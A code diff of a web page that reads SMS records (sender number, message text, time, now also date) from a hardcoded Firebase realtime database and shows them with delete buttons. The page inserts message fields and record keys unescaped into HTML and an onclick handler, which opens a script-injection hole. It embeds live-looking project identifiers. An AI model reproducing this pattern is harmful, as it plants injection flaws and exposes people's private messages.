@@ -482,8 +482,8 @@
     </div>
 
     <!-- Firebase scripts with defer for better performance -->
-    <script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-app-compat.js" defer></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-database-compat.js" defer></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-database-compat.js"></script>
     
     <script>
         // Optimized JavaScript with mobile-first approach
@@ -500,17 +500,16 @@
 
         function initializeApp() {
             // Firebase configuration
-          const firebaseConfig = {
-  apiKey: "AIzaSyA6ygfEVZLkepJc4S0KXKjChmM28jq5hZQ",
-  authDomain: "mxass-2ee08.firebaseapp.com",
-  databaseURL: "https://mxass-2ee08-default-rtdb.firebaseio.com",
-  projectId: "mxass-2ee08",
-  storageBucket: "mxass-2ee08.firebasestorage.app",
-  messagingSenderId: "64647995413",
-  appId: "1:64647995413:web:045644271bde105ac66e1c",
-  measurementId: "G-PZ9TQNV84H"
-};
-
+            const firebaseConfig = {
+                apiKey: "AIzaSyA6ygfEVZLkepJc4S0KXKjChmM28jq5hZQ",
+                authDomain: "mxass-2ee08.firebaseapp.com",
+                databaseURL: "https://mxass-2ee08-default-rtdb.firebaseio.com",
+                projectId: "mxass-2ee08",
+                storageBucket: "mxass-2ee08.firebasestorage.app",
+                messagingSenderId: "64647995413",
+                appId: "1:64647995413:web:045644271bde105ac66e1c",
+                measurementId: "G-PZ9TQNV84H"
+            };
             
             try {
                 // Initialize Firebase
@@ -625,6 +624,7 @@
                                 <p><span class="label"><i class="fas fa-phone"></i> Number: </span> <span class="data">${sms.a || 'N/A'}</span></p>
                                 <p><span class="label"><i class="fas fa-envelope-open-text"></i> Message: </span> <span class="data">${sms.b || 'N/A'}</span></p>
                                 <p><span class="label"><i class="fas fa-clock"></i> Time: </span> <span class="data">${sms.c || 'N/A'}</span></p>
+                                <p><span class="label"><i class="fas fa-calendar-day"></i> Date: </span> <span class="data">${sms.d || 'N/A'}</span></p>
                                 <div class="actions">
                                     <button class="delete-button" onclick="deleteSMS('${sms.key}', this)">
                                         <i class="fas fa-trash"></i> Delete
